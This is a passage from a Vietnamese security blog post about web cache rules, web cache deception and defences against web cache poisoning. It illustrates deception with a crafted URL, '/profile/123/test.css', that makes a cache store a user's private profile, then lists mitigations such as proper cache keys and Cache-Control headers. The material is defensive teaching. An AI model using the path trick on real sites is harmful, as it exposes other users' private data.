Trong thực tế, cache không lưu tất cả mọi thứ. Nó thường được cấu hình để chỉ cache những tài nguyên “an toàn”, chủ yếu là **static content** – những thứ ít thay đổi và không chứa thông tin nhạy cảm. Ngược lại, các nội dung động (dynamic content) như profile user, đơn hàng, session data… thường không nên bị cache để tránh rò rỉ dữ liệu.

Tuy nhiên, chính cách định nghĩa các rule này lại là nơi phát sinh vấn đề.

Các loại Cache rule phổ biến :

Trong nhiều hệ thống (đặc biệt là CDN), cache rules thường dựa vào pattern của URL. Một số dạng phổ biến bao gồm:

- **Static file extension rules**
    
    Cache sẽ lưu response nếu URL kết thúc bằng các đuôi quen thuộc như `.css`, `.js`, `.png`, `.jpg`...
    
    → Ví dụ:
    
    ```
    /assets/app.js
    ```
    
- **Static directory rules**
    
    Cache sẽ áp dụng cho các đường dẫn bắt đầu bằng prefix nhất định, ví dụ `/static`, `/assets`, `/images`...
    
    → Ví dụ:
    
    ```
    /static/logo.png
    ```
    
- **File name rules**
Một số file cụ thể gần như luôn được cache vì ít thay đổi, ví dụ:
    - `robots.txt`
    - `favicon.ico`

Ngoài ra, một số hệ thống còn có **custom rules** dựa trên:

- query parameters
- header
- hoặc thậm chí phân tích động của request

Nghe thì hợp lý, nhưng vấn đề xuất hiện khi:

> Cache áp dụng rule dựa trên **hình thức của URL**, trong khi server lại xử lý request dựa trên **logic bên trong**.
> 

Ví dụ:

```
/profile/123/test.css
```

- Cache thấy `.css` → nghĩ là file tĩnh → cho phép cache
- Server lại ignore phần `.css` → vẫn trả về dữ liệu profile user

Kết quả:

- Response chứa thông tin nhạy cảm bị cache
- Các user khác có thể truy cập lại cùng URL và nhận dữ liệu đó

Đây chính là nền tảng của **Web Cache Deception**.

> 
> 
> 
> Điều quan trọng là phải phân biệt giữa tấn công đánh lừa bộ nhớ cache web và tấn công làm nhiễm độc bộ nhớ cache web. Mặc dù cả hai đều khai thác cơ chế bộ nhớ cache, nhưng chúng thực hiện điều đó theo những cách khác nhau:
> 
> - Tấn công đầu độc bộ nhớ cache web bằng cách thao túng các khóa bộ nhớ cache để chèn nội dung độc hại vào phản hồi được lưu trong bộ nhớ cache, sau đó nội dung này sẽ được gửi đến người dùng khác.
> - Tấn công đánh lừa bộ nhớ cache web lợi dụng các quy tắc của bộ nhớ cache để lừa bộ nhớ cache lưu trữ nội dung nhạy cảm hoặc riêng tư, từ đó kẻ tấn công có thể truy cập được.

Vì bài viết này cũng khá dài rồi nên mình hẹn các bạn về chủ đề về Web Cache Deception vào bài viết sau nhé còn giờ thì mình cùng đi tới biện pháp phòng vệ cho lỗ hổng này 

## V.**Cách phòng ngừa các lỗ hổng đầu độc bộ nhớ cache web**

Để giảm thiểu rủi ro từ các kỹ thuật web cache poisoning, ngoài những cấu hình cơ bản, cần nhìn nhận vấn đề ở mức kiến trúc tổng thể thay vì chỉ vá từng điểm riêng lẻ.

- Chỉ cache nội dung **thực sự tĩnh**. Cẩn thận vì nếu attacker điều khiển được cách load resource (qua header), thì JS/CSS cũng có thể bị inject như bài lab demo ở rteen.
- Khi dùng **CDN / bên thứ ba**, cần kiểm soát header. Những header không cần thiết như `X-Forwarded-*` nên tắt, vì đây là nguồn gây cache poisoning phổ biến.
- Không nên loại bỏ tham số khỏi **cache key** chỉ để tối ưu. Nếu backend vẫn dùng thì sẽ thành **unkeyed input → dễ bị exploit**. Nên rewrite hoặc chuẩn hóa request.
- Tránh **fat GET request** (GET có body / override method) vì có thể làm lệch giữa cache và backend.
- Dùng **Cache-Control hợp lý**: `private` hoặc `no-store` cho dữ liệu nhạy cảm để tránh bị cache ngoài ý muốn.
- Đảm bảo mọi input ảnh hưởng đến response đều nằm trong **cache key**.
- **Validate input chặt chẽ**, không phản hồi trực tiếp dữ liệu từ header/query.
- Có thể dùng **WAF** để phát hiện request bất thường (đặc biệt là header manipulation).
- Không bỏ qua các lỗi client như **XSS**, vì kết hợp với cache poisoning có thể thành stored XSS.

Đây là document từ team của tụi mình mà bạn có thể tham khảo

[https://docs.google.com/document/d/1ygjSs-zsrErgpZUIl0HMPldfBSXBcy7xLod-IaMQGUM/edit?tab=t.0#heading=h.wypu79tk99ql](https://docs.google.com/document/d/1ygjSs-zsrErgpZUIl0HMPldfBSXBcy7xLod-IaMQGUM/edit?tab=t.0#heading=h.wypu79tk99ql)

Cảm ơn các bạn đã dành thời gian đọc bài viết của mình!!!